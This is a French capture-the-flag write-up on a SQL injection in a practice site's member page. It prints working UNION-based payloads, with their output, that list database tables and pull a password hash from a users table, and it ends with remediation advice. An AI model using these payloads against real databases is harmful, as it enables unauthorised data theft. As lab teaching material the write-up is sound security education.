# Explications
Injection SQL dans cette page ==> "http://ip/index.php?page=member",
dans le text field on test "1 or 1=1", lorsque l on soumet "1 or 1=1", la condition 1=1 est toujours vraie, donc si la requête SQL est mal construite, cela peut entraîner le renvoi de toutes les lignes de la table, révélant potentiellement des informations sensibles.

avec cette commande:
```
1 or 1=1 UNION SELECT table_name, table_schema FROM information_schema.tables -- 
```
on peut lister toutes les tables de la db et l on trouve une table nomme "users" 
"
ID: 1 or 1=1 UNION SELECT table_name, table_schema FROM information_schema.tables -- 
First name: users
Surname : Member_Sql_Injection
"
apres beaucoup de CMD essaye parfois sans convictions cette commande "1 or 1=1 UNION SELECT Commentaire,  countersign FROM users --"

nous fait obtenir 
"
ID: 1 or 1=1 UNION SELECT Commentaire,  countersign FROM users -- 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
"
je vais sur ce site "https://www.dcode.fr/fonction-hash" pour decrypter le pass ce qui me donne "FortyTwo" puis sur ce site "https://emn178.github.io/online-tools/sha256.html" j entre "fortytwo" pour avoir le flag.

# Malveillant
injection SQL est une vulnérabilité de sécurité qui permet à un attaquant d'interférer avec les requêtes d'une base de données. Cela peut permettre à l'attaquant de visualiser, modifier ou supprimer des données, ce qui peut avoir des conséquences graves sur la confidentialité, l'intégrité et la disponibilité des données de l'application.

# Regler
Utiliser des Requêtes Préparées (Prepared Statements): Cela permet de séparer clairement les données des instructions SQL, empêchant l'interprétation des entrées utilisateur comme des commandes SQL.
Valider et Nettoyer les Entrées Utilisateur: Assurez-vous que toutes les entrées correspondent au format attendu avant de les traiter.
Principe du Moindre Privilège: Limitez les droits de l'utilisateur de la base de données connecté par l'application à seulement ce qui est nécessaire pour fonctionner.
Utiliser des Mécanismes de Protection comme WAF (Web Application Firewalls): Ils peuvent aider à détecter et à bloquer les tentatives d'injection SQL.
